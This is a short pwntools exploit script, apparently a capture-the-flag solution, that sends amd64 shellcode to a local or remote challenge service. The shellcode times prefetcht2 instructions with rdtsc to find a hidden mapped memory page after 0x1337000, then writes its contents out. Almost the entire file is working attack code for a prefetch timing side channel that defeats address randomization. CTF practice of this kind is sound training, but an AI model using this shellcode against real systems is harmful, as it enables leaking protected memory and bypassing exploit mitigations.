from pwn import *
context.arch = "amd64"

# for measure: r8 is start address, r9 is end address, r10 is ptr to be checked
# for repeat_measure: r11 is ptr, r12 is sum
code = f"""
xor r14, r14
mov r14, 0x1337000
loop:
	// check every next page of memory
	add r14, 0x1000
	push r14
	call repeat_measure
	/* int3 */
	// cmp rax, 1200 threshold for remote
	cmp rax, 900
	jg loop

/* int3 */
// if we reach here, we found correct address
mov rdi, 1
mov rsi, r14
mov rdx, 100
mov rax, 1
syscall

mov rax, 60
syscall

measure:
	xor r8, r8
	xor r9, r9
	pop r13
	pop r10
	rdtsc
	shl	rdx,0x20
	or 	rax,rdx
	mov	r8, rax

	lfence
	nop
	mov rax, r10
	prefetcht2 BYTE PTR [rax]
	lfence
	nop

	rdtsc
	shl	rdx,0x20
	or 	rax,rdx
	mov	r9, rax

	sub r9, r8
	mov rax, r9
	push r13
	ret

repeat_measure:
	pop r15
	pop r11
	xor r12, r12
	xor rcx, rcx

	repeat_measure_loop:
		push r11
		call measure
		add r12, rax
		add rcx, 1

	cmp rcx, 20
	jl repeat_measure_loop

	mov rax, r12
	push r15
	ret
	"""

io = process("./chal")
# io = remote("amt.rs", 31173)

if args.GDB:
	gdbscript = """
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)

io.sendafter(b"> ", asm(code))

io.interactive()
